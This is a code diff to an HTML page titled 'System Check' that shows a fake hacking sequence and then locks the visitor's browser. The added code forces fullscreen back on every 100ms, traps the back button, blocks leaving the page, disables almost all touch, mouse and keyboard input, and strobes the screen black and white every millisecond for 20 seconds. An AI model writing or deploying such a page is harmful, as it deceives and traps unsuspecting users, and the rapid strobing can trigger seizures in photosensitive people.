@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Check</title>
     <style>
         body {
@@ -14,6 +14,10 @@
             overflow: hidden;
             height: 100vh;
             width: 100vw;
+            user-select: none; /* Makes text uncopyable */
+            -webkit-user-select: none; /* Safari */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* IE10+/Edge */
         }
         #terminal {
             white-space: pre-wrap;
@@ -66,6 +70,8 @@
         let i = 0;
         let lineIndex = 0;
         let flashingInterval;
+        let freezeTimeout;
+        let fullscreenInterval;
 
         function typeLine() {
             if (lineIndex >= lines.length) {
@@ -78,7 +84,7 @@
             if (i < currentLine.length) {
                 terminal.innerHTML += currentLine.charAt(i);
                 i++;
-                setTimeout(typeLine, 50 + Math.random() * 100);
+                setTimeout(typeLine, 20 + Math.random() * 50); // Faster typing speed
             } else {
                 terminal.innerHTML += '<br>';
                 if (currentLine.includes(".")) {
@@ -93,32 +99,61 @@
                             lineIndex++;
                             typeLine();
                         }
-                    }, 500);
+                    }, 300); // Faster dots
                 } else {
                     i = 0;
                     lineIndex++;
-                    setTimeout(typeLine, 800);
+                    setTimeout(typeLine, 500); // Faster line transitions
                 }
             }
 
             // Trigger the freeze + flash when "HACK COMPLETE" finishes
             if (currentLine === "HACK COMPLETE") {
-                setTimeout(startFreezeAndFlash, 1500);
+                setTimeout(startFreezeAndFlash, 1000);
             }
         }
 
-        function startFreezeAndFlash() {
-            // Try to go fullscreen (helps hide browser UI on mobile/desktop)
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
+        function enterFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(() => {});
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
             }
+        }
+
+        function isFullscreen() {
+            return document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+        }
+
+        function startFreezeAndFlash() {
+            enterFullscreen();
+
+            // Force re-enter fullscreen if exited
+            fullscreenInterval = setInterval(() => {
+                if (!isFullscreen()) {
+                    enterFullscreen();
+                }
+            }, 100); // Check every 100ms
+
+            // Prevent back navigation during freeze
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => {
+                history.pushState(null, null, location.href);
+                enterFullscreen(); // Force back to fullscreen on back attempt
+            };
+
+            // Block unload/leave attempts
+            window.onbeforeunload = () => "System locked - cannot exit.";
 
             // Show invisible overlay to block all input
             overlay.style.display = 'block';
 
-            // Block all possible user interactions
+            // Block all possible user interactions (unmovable screen)
             const blockEvent = (e) => {
                 e.preventDefault();
                 e.stopPropagation();
@@ -126,12 +161,13 @@
             };
 
             ['touchstart', 'touchmove', 'touchend', 'touchcancel',
-             'mousedown', 'mousemove', 'mouseup', 'click',
-             'keydown', 'keyup', 'scroll', 'wheel'].forEach(evt => {
+             'mousedown', 'mousemove', 'mouseup', 'click', 'dblclick',
+             'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'gesturestart',
+             'gesturechange', 'gestureend'].forEach(evt => {
                 window.addEventListener(evt, blockEvent, { passive: false, capture: true });
             });
 
-            // Rapid background flashing (as fast as browser allows, ~4ms minimum)
+            // Rapid background flashing (stronger, faster)
             let isBlack = true;
             flashingInterval = setInterval(() => {
                 document.body.style.backgroundColor = isBlack ? 'white' : 'black';
@@ -139,21 +175,29 @@
             }, 1);
 
             // Stop everything after 20 seconds
-            setTimeout(() => {
+            freezeTimeout = setTimeout(() => {
                 clearInterval(flashingInterval);
+                clearInterval(fullscreenInterval);
                 document.body.style.backgroundColor = 'black';
                 overlay.style.display = 'none';
 
                 // Remove event blockers
                 ['touchstart', 'touchmove', 'touchend', 'touchcancel',
-                 'mousedown', 'mousemove', 'mouseup', 'click',
-                 'keydown', 'keyup', 'scroll', 'wheel'].forEach(evt => {
+                 'mousedown', 'mousemove', 'mouseup', 'click', 'dblclick',
+                 'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'gesturestart',
+                 'gesturechange', 'gestureend'].forEach(evt => {
                     window.removeEventListener(evt, blockEvent, { passive: false, capture: true });
                 });
+
+                // Allow exit/back after freeze
+                window.onpopstate = null;
+                window.onbeforeunload = null;
 
                 // Exit fullscreen
                 if (document.exitFullscreen) document.exitFullscreen();
                 else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+                else if (document.mozCancelFullScreen) document.mozCancelFullScreen();
+                else if (document.msExitFullscreen) document.msExitFullscreen();
             }, 20000); // 20 seconds
         }
 
@@ -161,7 +205,7 @@
         setTimeout(() => {
             terminal.innerHTML = '> ';
             typeLine();
-        }, 1000);
+        }, 500); // Faster start
     </script>
 </body>
-</html>           
+</html>
